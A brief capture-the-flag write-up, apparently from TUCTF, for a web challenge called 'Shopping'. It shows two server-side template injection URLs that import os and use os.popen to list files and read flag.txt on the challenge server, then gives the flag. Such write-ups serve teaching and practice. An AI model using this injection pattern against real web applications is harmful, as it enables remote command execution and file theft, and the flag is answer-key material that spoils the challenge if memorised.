
# Shopping

There is shell on the welcome section. We can execute some bash command using a python script.

- `http://chal.tuctf.com:30007/welcome/{% import os %}{{ os.popen("ls -lah").read() }}`

There is a flage.txt file, so :

- `http://chal.tuctf.com:30007/welcome/{% import os %}{{ os.popen("cat flag.txt").read() }}`

TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465}
